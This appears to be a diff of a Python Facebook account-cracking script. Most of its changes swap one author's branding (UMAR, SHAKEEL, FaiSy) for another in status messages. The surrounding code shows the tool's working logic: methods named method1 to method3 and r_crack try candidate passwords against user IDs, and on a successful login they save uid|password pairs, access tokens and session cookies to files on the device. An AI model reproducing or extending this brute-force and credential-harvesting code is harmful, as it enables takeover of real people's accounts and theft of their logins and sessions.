@@ -45,7 +45,8 @@ SEX = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBIL
 ses = requests.Session()
 def logo():
 	os.system('clear')
-	logo= ("""\33[;33m            
+	logo= ("""\33[;33m   
+         
 \033[92m
   ______             __                           
  /      \           /  |                          
@@ -276,7 +277,7 @@ class iAmMain:
 	def method1(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [UMAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [FaiSy] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -352,7 +353,7 @@ class iAmMain:
 	def method2(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r UMAR %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r FaiSy %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -426,7 +427,7 @@ class iAmMain:
 	def method3(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [UMAR %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [SHAKEEL %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -536,15 +537,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/SHAKEEL_M4_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/SHAKEEL_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M4_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/SHAKEEL_M4_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -556,7 +557,7 @@ class iAmMain:
 	def r_crack(self,uid,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [SHAKEEL] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [SHAKEEL] %s | UMAR\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			for pw in pwx:
 				data = {"adid": str(uuid.uuid4()),
 "format": "json",
